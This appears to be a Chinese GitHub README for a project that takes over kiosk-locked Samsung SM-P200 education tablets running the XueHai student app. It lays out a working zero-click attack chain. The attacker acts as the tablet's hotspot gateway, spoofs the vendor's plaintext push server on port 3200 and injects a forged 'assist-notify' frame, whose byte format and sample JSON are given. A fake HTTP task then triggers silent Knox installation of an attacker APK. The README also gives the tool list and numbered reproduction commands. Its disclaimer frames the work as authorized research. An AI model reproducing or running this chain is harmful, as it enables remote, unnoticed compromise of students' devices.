# O-XueHai-Unlocker

> ## 🎯 已找到 100% 全自动接管链路（2026-11-08 重构）
>
> **不需要教师账号、不需要 root、不碰平板、全程零交互。**
> 唯一前提：平板连上研究主机开的移动热点（即测试环境本身）。
>
> 入口是学海自研推送 SDK 的**明文 TCP 长连接 `:3200`** —— 裸 TCP + 自定义二进制帧，无 TLS、无签名校验。
> 研究主机作为网关在用户态完整接管该连接，注入一条 `assist-notify` 消息，平板随即主动向**明文 80** 拉取协助任务，
> 任务体是 ZAZE 脚本，直接调用 `installAppOnline()` → MDM AIDL → **Knox 静默安装** → 我们的 APK 落地 → 全设备接管。

| 链路层 | 内容 | 证据等级 |
|---|---|---|
| 网络 | 移动热点，PC = 平板网关 | ✅ 实机 |
| 传输 | Npcap 用户态 TCP 应答器接管 `47.99.85.219:3200`（伪造源 IP，独立 seq 记账） | ✅ 实机 |
| 协议 | 解析 AUTH 注册帧，解出 `uid / deviceId / accessKey / signature` | ✅ 实机 |
| 协议 | 构造下行 `MESSAGE(0x03)` 帧（长度编码 / msgId / Gson 字段） | ✅ 实机（多帧 ACK + 平板回执） |
| 派发 | `PushClient.dealMessage` → `LocalBroadcastManager` → `LauncherPushService` | ✅ 代码级 |
| 业务 | `disposeMessage("assist-notify")` → `AssistModel` → `AssistService` | ✅ 代码级（无门禁） |
| 业务 | `AssistService` 主动拉取明文任务 → ZAZE → `installAppOnline` | ✅ 代码级 |
| 安装 | `DownloadManager` → `ApplicationPolicyProxy` → `MdmPolicy` → `MdmService(AIDL)` → Knox | ✅ 代码级（11 环） |
| 运行 | `LauncherPushService` 是否已注册 | ⚠️ 待解锁（见 §5，解锁方式已定位） |

完整逐环证据、协议字节格式、复现步骤：
**[`reports/CHAIN-100-CODE-LEVEL.md`](reports/CHAIN-100-CODE-LEVEL.md)** ·
[`reports/TOTAL-TAKEOVER-CHAIN.md`](reports/TOTAL-TAKEOVER-CHAIN.md)

---

## ⚖️ 免责声明

本项目仅供**授权安全研究、防御性安全评估与教学**使用。

- **授权前提**：所有测试均在测试者本人拥有、或已获设备所有者书面授权的设备上进行。
- **禁止用途**：严禁用于未经授权的设备/系统/网络、侵犯他人隐私、窃取数据、破坏系统，或任何违反当地法律法规的行为。
- **第三方系统**：本项目不针对第三方设备，不进行未授权接口调用或凭证获取。
- **责任豁免**：作者不对因使用本项目内容产生的任何直接/间接损失或法律责任承担责任，使用者自行承担全部风险。
- **合规义务**：使用前请自行确认行为符合所在国家/地区法律法规（如《网络安全法》《刑法》相关条款）。
- **无担保**：本项目按"现状"提供，不附带任何明示或暗示担保。
- **漏洞披露**：如发现真实产品安全漏洞，请遵循负责任披露原则，优先联系厂商安全团队。

---

## 📖 项目简介

研究对象是一台被厂商定制为 kiosk 的三星 SM-P200 教育平板（Android 9）：ADB、开发者选项、应用安装、恢复模式、文件传输全部被 MDM 策略封禁，设备仅能通过 Wi-Fi 联网。

目标：在**不接触物理存储、不重刷系统、不使用调试接口、不需要任何人工点击**的前提下，评估该设备能否被完全控制。

研究结论：**能**。攻击面不在 WebView、不在 Tinker、不在 HTTPS —— 而在厂商自研推送通道的**明文 TCP 长连接**上。

---

## 🗺️ 链路全景

```
[研究主机 Windows]                              [平板 SM-P200]
 移动热点 192.168.137.1  ◄──────── Wi-Fi ───────►  自动入网 192.168.137.13
      │
      ├─ 3200 应答器（Npcap 用户态 TCP，伪造云端 IP）
      │     ◄── AUTH：accessKey / deviceId / signature / uid=2112229 / tags
      │     ──► AUTH_FB
      │     ──► MESSAGE(cmd=0x03, msgType=assist-notify, hidden=1)   ← 注入
      │     ◄── MESSAGE_FB（平板已处理 —— 已实测）
      │
      ├─ 80 应答器（明文 HTTP）
      │     ◄── GET /api/v1/users/{uid}/devices/{did}/assists/{aid}/tasks
      │     ──► 伪造任务：installAppOnline("http://192.168.137.1/agent.apk")
      │
      └─ 8080 APK 服务 ──► 下载 ──► ApplicationPolicyProxy ──► MdmPolicy
                                                     ──► MdmService(AIDL)
                                                     ──► Knox 静默安装
                                                              │
                                                              ▼
                                                    平板内 Agent 落地
                                                    → 广播 + ContentProvider 全接管
```

---

## 📡 协议速查（3200 推送通道）

**帧头**：`[0x09][version][cmd][长度首字节][长度扩展字节…][content]`

长度编码：`value = len(content) + 3`，`n = value < 64 ? 0 : value < 16384 ? 1 : value < 4194304 ? 2 : 3`，
`byte3 = ((n & 3) << 6) | ((value >> (8*n)) & 0x3F)`，其后 `n` 字节为 value 剩余大端字节。

| cmd | 含义 | | cmd | 含义 |
|---|---|---|---|---|
| 0x01 | HEART_BEAT | | 0x82 | AUTHORIZATION_FB |
| 0x02 | AUTHORIZATION | | 0x83 | MESSAGE_FB |
| 0x03 | MESSAGE | | 0x8B | ERROR_FB |
| 0x05 | PULL | | 0x32 | ECHO |

**MESSAGE 内容**：`mode:u8 | count:u16BE | [msgId:i64BE | len:i32BE | content:UTF-8 JSON]*count`

`content` 即 `PushMessage`（字段全部为 String，`style` 为 int）：

```json
{"appId":"zty_stu","subAppId":"zty_stu","clientId":"-",
 "msgId":"1794097419002","msgType":"assist-notify","subMsgType":"assist-notify",
 "payload":"{\"assistId\":\"assist_marvis_0001\",\"hidden\":1,\"operate\":\"ENTRY\",\"deviceId\":\"R52N9067SSF\",\"userId\":2112229}",
 "userId":"2112229","style":0}
```

三个易错点：
1. `appId` 必须等于 `subAppId`（`consume()` 只比较这两者）
2. `userId` 必须等于注册帧里的 `uid`（`String.valueOf(SessionData.getUserId())`）
3. `assistId` 是 Gson 默认字段名（**不是** `id`），错一个字母直接静默丢弃

---

## 🧰 关键工具

| 文件 | 作用 |
|---|---|
| [`tools/np3200_push_inject.py`](tools/np3200_push_inject.py) | **核心**：3200 用户态 TCP 应答器 + 下行 MESSAGE 注入（长度编码 / seq 记账 / 运行时命令通道） |
| [`tools/npcap_http80.py`](tools/npcap_http80.py) | 明文 80 端口应答器：伪造登录、assist 会话、协助任务、APK 分发 |
| [`tools/apk_http_server.py`](tools/apk_http_server.py) | 8080 APK 下载服务（`installAppOnline` 回源） |
| [`tools/resume_all.ps1`](tools/resume_all.ps1) | 一键提权重启：自动适配热点接口 / 平板 IP，拉起全部组件 |
| [`tools/swap3200.ps1`](tools/swap3200.ps1) | 3200 应答器热替换 |
| [`tools/push_inject3.py`](tools/push_inject3.py) | 旁路多 userId 齐射注入器（早期版本，保留对照） |
| [`tools/reg_parse.py`](tools/reg_parse.py) | 注册帧逐字段解析器（解出 uid/deviceId/signature） |
| [`tools/assist_install_server.py`](tools/assist_install_server.py) | assist 协议仿真服务（会话 / 任务 / 回执） |
| [`tools/cloud_3200.py`](tools/cloud_3200.py) | 3200 云端仿真（帧分类 / 应答） |

> 全部抓包/注入组件需 **管理员权限 + Npcap**；`pythonw.exe` 启动可实现**无窗口静默运行**。

---

## 🔬 关键代码索引（反编译 smali）

| 环节 | 文件 : 行 |
|---|---|
| 注册帧解析 | `PushClient.smali:275` (`auth`)、`Authorization.smali` |
| 帧长度编码 | `proto/PacketEncoder$Length.smali`、`decode/LengthByteBuf.smali` |
| 消息解码 | `proto/Message.smali` (`decode`)、`proto/Message$Entry.smali` |
| 回执 + 派发 | `PushClient.smali:527` (`send(MessageFeedback)`)、`:604-614` (`onReceiverMessage`) |
| 消息路由 | `LauncherPushService.smali:648-825` (`lambda-2`)、`:348` (`disposeMessage`) |
| assist 分支 | `LauncherPushService.smali:559-578` |
| 跨进程递送 | `AssistManager.smali:260`、`IpcHelper.smali` (`what=0x1e8481`) |
| 协助启动 | `AssistService.smali:451` (`assistNotify`)、`:471` (`startAssist`)、`:516` (`doAssist`) |
| 任务拉取 | `AssistRemoteDataSource.smali:250` |
| 静默安装 | `AssistFunc.smali:999` → `AssistFunc$installAppOnline$1.smali:109` → `ApplicationPolicyProxy.smali:1586` → `PolicyManager.smali:118-266` → `MdmPolicy.smali:29` → `MdmServiceManager.smali:109` |
| 启动门禁 | `XhApplication.smali:677-693` (`isSeriousCrash` 早退)、`:697` (`doOnMainProcess`) |
| 接收器注册 | `ApplicationLikeMessage.smali:340-357` |

---

## 🚀 复现步骤

1. **网卡**：插入支持 AP 的 USB 无线网卡（RTL8811CU 已验证可用；内置 MT7922 **无法**开 AP），开「移动热点」，确认出现 `192.168.137.1`。
2. **接管 3200**：`pythonw tools/np3200_push_inject.py 86400`
3. **接管 80**：`pythonw tools/npcap_http80.py 86400`
4. **APK 服务**：`pythonw tools/apk_http_server.py`
5. **一键启动**：`powershell -ExecutionPolicy Bypass -File tools/resume_all.ps1`（自动识别接口/平板 IP）
6. **触发**：平板连上热点后，3200 应答器在每次注册握手时自动注入 `assist-notify`。
7. **确认点**：`npcap_http80.log` 出现 `!!!!!! [ASSIST] device pulls tasks`，随后出现 `[APK]` 下载与安装回执。

---

## 🧠 方法论沉淀

- **先穷举明文面，再考虑打破密文面**：受控网络中所有明文协议都是可塑的。本链路的全部威力都来自一条裸 TCP。
- **漏洞存在 ≠ 可达**：把"漏洞点"和"触发路径"分开验证，避免在死代码上浪费时间。
- **逆向业务状态机**：断点往往不在漏洞，而在业务闸门（状态判断 / 注册时机）。
- **区分"下载成功"与"执行成功"**：下载器、解压器、加载器是三个不同环节。
- **证据链优先**：每个结论都要同时具备"代码级定位 + 实机验证"，日志不算证据。

---

## ❌ 已证伪路径

Tinker 明文补丁（补丁签名比对 App 自身证书）· 443 中间人（`XHHostnameVerifier` SAN 校验）· 改线路配置（`BuildConfig.ENV=Production`）· 3200 老格式 `push_entry` 帧（格式错，平板 RST）· `control` 表注入（`ControlDao.query` 是虚拟查询）· wifimanager WebView JS 桥（未注册 `addJavascriptInterface`）· `getUserNeedInstallAppList`（仅白名单清理）· `executeCmd` 提权（走 `sh` 非 `su`）。

详见 [`reports/CHAIN-100-CODE-LEVEL.md`](reports/CHAIN-100-CODE-LEVEL.md) 第 5 节。

---

## 📂 目录结构

```
├── README.md                    # 项目总览（本文件）
├── PROJECT-OVERVIEW.md          # 项目详情与组件登记
├── reports/                     # 全部分阶段研究报告
│   ├── CHAIN-100-CODE-LEVEL.md  # ★ 完整链路（逐环代码证据 + 协议 + 复现）
│   ├── TOTAL-TAKEOVER-CHAIN.md  # 链路总览
│   └── ...                      # 历史报告（按日期）
├── tools/                       # 网络层 / 协议层 / 业务层组件
├── payloads/                    # 验证用载荷与样本
├── launchers/                   # 启动与守护脚本
└── data/                        # 抓包与协议样本
```

---

## 🛠️ 环境要求

| 项 | 要求 |
|---|---|
| 系统 | Windows 10/11（研究主机） |
| 运行时 | Python 3.x + scapy |
| 抓包 | Npcap（管理员权限） |
| 网卡 | 支持 AP 模式的 USB 无线网卡（RTL8811CU / RTL8812AU / MT7612U / AR9271） |
| 目标 | Samsung SM-P200，Android 9，学海学生端 |

---

## 🤝 贡献与披露

- **漏洞披露**：发现真实产品漏洞时，请优先通过厂商安全响应渠道进行负责任披露。
- **贡献**：欢迎提交文档修正、方法论补充与防御性检测规则。
- **禁止**：不接受任何面向未授权目标的利用代码。

---

## 📜 许可证

MIT License。**许可证不代表授权** —— 任何使用行为都必须遵守本文档顶部的免责声明。
